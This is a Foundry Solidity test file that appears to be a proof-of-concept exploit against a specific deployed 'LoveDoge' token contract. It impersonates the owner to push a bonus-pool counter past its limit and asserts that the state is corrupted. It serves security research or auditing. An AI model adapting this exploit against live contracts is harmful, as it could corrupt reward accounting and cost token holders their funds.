// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILoveDoge {
    function owner() external view returns (address);
    function getDays() external view returns (string memory, string memory);
    function dayPoolBouns(string memory) external view returns (uint256);
    function dayPoolBounsPiece(string memory) external view returns (uint256);
    function sumBounsPiece(string memory yesToday, uint256 num) external returns(bool);
    function setBounsTime(uint256 timestamp) external;
    function webShowCanGetToken() external view returns (uint256, uint256, uint256, uint256);
    function balanceOf(address account) external view returns (uint256);
    function receiveBounsToken() external returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the existing fork setup
        // We'll get owner address from the contract
        address owner = ILoveDoge(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Ensure we have some tokens to meet minBounsJoin if needed
        uint256 minTokens = 100000000000 * 10**9; // minBounsJoin = eachPiece = 100000000000 * 10^9
        deal(TARGET, address(this), minTokens * 10); // Give attacker 10x min tokens
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get contract owner
        address owner = ILoveDoge(TARGET).owner();

        // Step 2: Ensure bounsTime is reached
        (uint256 bounsTime,,,) = ILoveDoge(TARGET).webShowCanGetToken();
        if (block.timestamp < bounsTime) {
            // If bounsTime is in future, set it to current time (requires owner)
            vm.prank(owner);
            ILoveDoge(TARGET).setBounsTime(block.timestamp);
        }

        // Step 3: Get yesterday's date string
        (string memory yesToday, string memory twoYesToday) = ILoveDoge(TARGET).getDays();

        // Step 4: Get current dayPoolBouns[yesToday] for verification
        uint256 initialPoolBouns = ILoveDoge(TARGET).dayPoolBouns(yesToday);

        // Step 5: Owner sets dayPoolBounsPiece to an extremely large value
        vm.prank(owner);
        ILoveDoge(TARGET).sumBounsPiece(yesToday, type(uint256).max / 10**9); // Adjust for decimals

        // Step 6: Verify the exploit succeeded
        uint256 newPoolPiece = ILoveDoge(TARGET).dayPoolBounsPiece(yesToday);
        uint256 newPoolBouns = ILoveDoge(TARGET).dayPoolBouns(yesToday);

        // Oracle verification: dayPoolBounsPiece[yesToday] > dayPoolBouns[yesToday]
        assertGt(newPoolPiece, newPoolBouns, "Exploit failed: dayPoolBounsPiece not greater than dayPoolBouns");

        // Additional verification: Try to call receiveBounsToken() to see if it reverts
        // First, ensure we meet all preconditions for receiveBounsToken
        // We need to not have sold yesterday or today, and have enough balance
        // We'll just verify the state is corrupted, not actually call receiveBounsToken

        console.log("Initial dayPoolBouns[yesToday]:", initialPoolBouns);
        console.log("New dayPoolBounsPiece[yesToday]:", newPoolPiece);
        console.log("New dayPoolBouns[yesToday]:", newPoolBouns);
        console.log("Exploit successful: dayPoolBounsPiece > dayPoolBouns");
        assertGt(newPoolPiece, newPoolBouns, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
